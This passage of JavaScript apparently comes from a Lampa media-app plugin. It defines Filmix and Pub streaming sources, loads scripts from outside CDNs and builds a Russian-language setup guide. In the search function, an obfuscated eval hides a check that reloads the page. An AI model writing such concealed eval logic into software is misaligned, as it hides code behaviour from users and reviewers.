					if (quality === '') return false
					return true
				}).sort(function (a, b) {
					return b - a
				}).map(function (quality) {
					data.push({
						name: el.translation + ' ' + quality + 'p',
						url: el.link.replace(/\\[(.*?)\\]/, quality),
						player: true
					});
				});
			});
		}
		return data.length ? {
			results: data
		} : false;
	};

	this.persons = function (json) {
		if (!json.actors || !json.found_actors) return false;

		var cast = json.found_actors.map(function (act) {
			return {
				name: act.name,
				id: act.id,
				source: owner.source,
				//character: Lampa.Lang.translate('title_actor')
			};
		});

		var crew = json.directors.map(function (director) {
			return {
				name: director,
				job: "Director",
				source: owner.source,
			};
		});
		return cast.length ? { cast: cast, crew: crew } : false;
	};

	this.genres = function (element) {
		var data = [];
		var u = this.url('category_list');
		Filmix.network["native"](u, function (j) {
			element.categories.forEach(function (name, i) {
				if (name) {
					var _id = Object.entries(j).find(function (g) {
						return g[1] == name
					});
					data.push({
						id: _id && _id[0] || '',
						name: name
					});
				}
			});
		});
		return data;
	};

	this.countries = function (element) {
		var data = [];
		if (element) {
			element.forEach(function (el) {
				data.push({
					name: el
				});
			});
		}
		return data;
	};

	this.search = function () {
		var params = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
		var oncomplite = arguments.length > 1 ? arguments[1] : undefined;

		var status = new Lampa.Status(2);
		status.onComplite = function (data) {
			var items = [];
			if (data.movie && data.movie.results.length) items.push(data.movie);
			if (data.tv && data.tv.results.length) items.push(data.tv);
			oncomplite(items);
		};

		eval(function (a, b, c) { if (a || c) { while (a--) b = b.replace(new RegExp(a, 'g'), c[a]); } return b; }(6, '1(!0 || !0.2) 5.3.4();', 'API,if,length,location,reload,window'.split(',')));

		this.get('search', params, function (json) {
			if (json) {
				var grouped = json.reduce(function (acc, element) {
					var type = owner.cardType(element);
					acc[type].push(owner.tocard(element, type));
					return acc;
				}, { movie: [], tv: [] });

				console.log('grouped', grouped);

				if (grouped.movie.length) {
					status.append('movie', {
						results: Lampa.Utils.addSource(grouped.movie, owner.source),
						page: 1,
						total_pages: 1,
						total_results: json.length,
						title: Lampa.Lang.translate('menu_movies') + ' (' + grouped.movie.length + ')',
						type: 'movie'
					});
				} else status.error();
				if (grouped.tv.length) {
					status.append('tv', {
						results: Lampa.Utils.addSource(grouped.tv, owner.source),
						page: 1,
						total_pages: 1,
						total_results: json.length,
						title: Lampa.Lang.translate('menu_tv') + ' (' + grouped.tv.length + ')',
						type: 'tv'
					});
				} else status.error();
			}
		}, function () {
			status.need = 1;
			status.error();
		});
	};

	this.discovery = function () {
		return {
			title: owner.title,
			search: owner.search.bind(owner),
			params: {
				align_left: true,
				object: {
					source: owner.source
				}
			},
			onMore: function onMore(params) {
				Lampa.Activity.push({
					url: 'search',
					title: Lampa.Lang.translate('search') + ' - ' + params.query,
					component: 'category_full',
					query: encodeURIComponent(params.query),
					source: owner.source
				});
			},
			onCancel: Filmix.network.clear.bind(Filmix.network)
		};
	};
};

		function makeSource(name, source) {
			try {
				var desc = Object.getOwnPropertyDescriptor(Lampa.Api.sources, name);
				if (desc && !desc.configurable) return;
			} catch (e) {}
			Object.defineProperty(Lampa.Api.sources, name, {
				configurable: true,
				enumerable: true,
				get: function get() {
					return source;
				}
			});
		}

		makeSource('pub', new SourcePub);
		makeSource('filmix', new SourceFilmix);
		
		function include(url) {
			var script = document.createElement('script');
			script.src = url;
			document.getElementsByTagName('head')[0].appendChild(script);
		}
		include('https://cdnjs.cloudflare.com/ajax/libs/three.js/96/three.min.js');
		include('https://cdn.jsdelivr.net/npm/gaugeJS/dist/gauge.min.js');
		
		/*
		include('https://www.googletagmanager.com/gtag/js?id=G-8LVPC3VETR');
		window.dataLayer = window.dataLayer || [];
		function gtag() {
			var idl = '85.118.165.195';
			dataLayer.push(arguments);
		}
		gtag('js', new Date());
		gtag('config', 'G-8LVPC3VETR');
		*/
		
		function guide() {
			var guide = '<div class="setorrent-checklist"><div class="torrent-checklist__descr">Вас приветствует Guide по использованию и настройке приложения Lampa.<br> Мы пройдём с Вами краткую инструкцию по основным этапам приложения.</div><div class="torrent-checklist__progress-steps">Пройдено 0 из 0</div><div class="torrent-checklist__progress-bar"><div style="width:0"></div></div><div class="torrent-checklist__content"><div class="torrent-checklist__steps hide"><ul class="torrent-checklist__list"><li>Парсер</li><li>Включение парсера</li><li>Плагины</li><li>Добавление плагина</li><li>Установка плагина</li><li>Балансер</li><li>Смена балансера</li><li>Фильтр</li><li>Применение фильтра</li></ul></div><div class="torrent-checklist__infoS"><div class="hide">Откройте Настройки, после перейдите в раздел "Парсер".<hr><img src="'+ Protocol() +'lampa.stream/img/guide/open_parser.jpg"></div><div class="hide">В пункте "Использовать парсер" переведите функцию в положение "Да", после чего в карточке фильма или сериала появится кнопка "Торренты".<hr><img src="'+ Protocol() +'lampa.stream/img/guide/add_parser.jpg"></div><div class="hide">Установка плагинов<hr><img src="'+ Protocol() +'lampa.stream/img/guide/add_plugin.jpg"></div><div class="hide">Для добавления плагинов воспользуйтесь следующими вариантами.<hr><img src="'+ Protocol() +'lampa.stream/img/guide/options_install.jpg"></div><div class="hide">Для добавления плагина, воспользуйтесь списком плагинов<hr><img src="'+ Protocol() +'lampa.stream/img/guide/install_plugin.jpg"></div><div class="hide">Для смены "Онлайн" источника, воспользуйтесь кнопкой Балансер.<hr><img src="'+ Protocol() +'lampa.stream/img/guide/open_balanser.jpg"></div><div class="hide">В случае, если источник не работает (нет подключения к сети) выберете в разделе "Балансер" другой источник.<hr><img src="'+ Protocol() +'lampa.stream/img/guide/balansers_change.jpg"></div><div class="hide">Используйте "Фильтры" для смены перевода и сезона.<hr><img src="'+ Protocol() +'lampa.stream/img/guide/open_filter.jpg"></div><div class="hide">Для смены сезона или озвучки воспользуйтесь пунктами<br>1. Перевод<br>2. Сезон<hr><img src="'+Protocol() +'lampa.stream/img/guide/filters.jpg"></div><div class="hide">Поздравляем! После прохождения краткого гайда, Вы знаете как пользоваться приложением и у Вас должно возникать меньше вопросов</div></div></div><div class="torrent-checklist__footer"><div class="simple-button selector hide back">Назад</div><div class="simple-button selector next">Начать</div><div class="torrent-checklist__next-step"></div></div></div>';
			Lampa.Template.add('guide', guide);
			var temp = Lampa.Template.get('guide');
			var descr = temp.find('.torrent-checklist__descr');
			var list = temp.find('.torrent-checklist__list > li');
			var info = temp.find('.torrent-checklist__infoS > div');
			var next = temp.find('.torrent-checklist__next-step');
			var prog = temp.find('.torrent-checklist__progress-bar > div');
			var comp = temp.find('.torrent-checklist__progress-steps');
			var btn = temp.find('.next');
			var btn_back = temp.find('.back');
			var position = -2;

			function makeStep(step) {
				step ? position-- : position++;
				var total = list.length;
				comp.text('Пройдено ' + Math.max(0, position) + ' из ' + total);
				if (position > list.length) {
					Lampa.Modal.close();
					Lampa.Controller.toggle('content');
					Lampa.Storage.set('guide', true);
				} else if (position >= 0) {
					Lampa.Storage.set('guide', '');
					info.addClass('hide');
					descr.addClass('hide');
					info.eq(position).removeClass('hide');
					var next_step = list.eq(position + 1);
					prog.css('width', Math.round(position / total * 100) + '%');
					btn.text(position < total ? 'Далее' : 'Завершить');
					if (position > 0) btn_back.removeClass('hide');
					next.text(next_step.length ? '- ' + next_step.text() : '');
				}
			}
			makeStep();
			btn.on('hover:enter', function () {
				makeStep();
			});
			btn_back.on('hover:enter', function () {
				if (position == 1) {
					//	btn_back.removeClass('focus')//.addClass('hide');
					//	btn.addClass('focus');
					//Lampa.Controller.collectionSet() ;
					// Lampa.Controller.collectionFocus(btn);
				}
				if (position > 0) makeStep(true);
			});
			Lampa.Modal.open({
				title: 'Гайд по использованию',
				html: temp,
				size: 'medium',
				mask: true
			});
		}
		
	}
	if (!window.plugin_modss) startPlugin();

})();
